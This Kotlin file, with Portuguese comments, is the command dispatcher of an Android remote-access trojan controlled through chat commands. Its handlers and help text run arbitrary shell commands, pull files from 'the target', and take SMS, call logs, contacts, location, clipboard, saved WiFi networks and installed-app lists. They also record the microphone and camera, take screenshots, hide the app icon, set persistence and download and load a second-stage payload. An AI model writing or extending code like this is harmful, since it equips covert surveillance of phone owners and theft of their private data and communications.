package com.serv.app.cmds

import android.content.Context
import com.serv.app.service.BotService

class CmdRouter(private val svc: BotService) {

    /** Trata a mensagem. Retorna texto de resposta (ou "" para envio assíncrono). */
    fun handle(ctx: Context, text: String): String {
        val trimmed = text.trim()
        if (!trimmed.startsWith("/")) return ""
        val space = trimmed.indexOf(' ')
        val cmd = if (space < 0) trimmed.substring(1) else trimmed.substring(1, space)
        val args = if (space < 0) "" else trimmed.substring(space + 1).trim()

        return try {
            when (cmd.lowercase()) {
                "help", "start" -> help()
                "sh"   -> ShellCmd.run(args)
                "dl"   -> FileDown.run(args)
                "up"   -> FileUp.begin(ctx, args)
                "loc"  -> LocationCmd.run(ctx)
                "sms"  -> SmsCmd.run(ctx)
                "calls"-> CallsCmd.run(ctx)
                "contacts" -> ContactsCmd.run(ctx)
                "mic"  -> MicCmd.run(ctx, args)
                "cam"  -> CamCmd.run(ctx, args)
                "ss"   -> ScreenCmd.run(ctx)
                "apps" -> AppsCmd.run(ctx)
                "clip" -> ClipCmd.run(ctx)
                "wifi" -> WifiCmd.run(ctx)
                "persist" -> svc.onPersist(ctx, args)
                "hide" -> svc.onHide(ctx)
                "sleep"-> svc.onSleep(args)
                "load" -> {
                    val r = com.serv.app.core.Dropper.downloadAndLoad(ctx, args)
                    svc.stage2Url = args
                    r
                }
                else -> "cmd desconhecido: /$cmd"
            }
        } catch (t: Throwable) {
            "ERRO: ${t.javaClass.simpleName}: ${t.message}"
        }
    }

    private fun help(): String = """
        /help                 – esta lista
        /sh <cmd>             – shell
        /dl <caminho>         – baixa arquivo do alvo
        /up <caminho_destino> – envia próximo arquivo do chat
        /loc                  – última localização
        /sms                  – últimas 50 SMS
        /calls                – log de chamadas
        /contacts             – agenda
        /mic <seg>            – grava áudio
        /cam front|back <seg> – captura foto/vídeo
        /ss                   – screenshot (requer grant)
        /apps                 – apps instalados
        /clip                 – área de transferência
        /wifi                 – SSIDs salvos
        /persist on|off       – persistência
        /hide                 – oculta ícone
        /sleep <seg>          – intervalo de poll
        /load <url>           – baixa 2ª fase
    """.trimIndent()
}
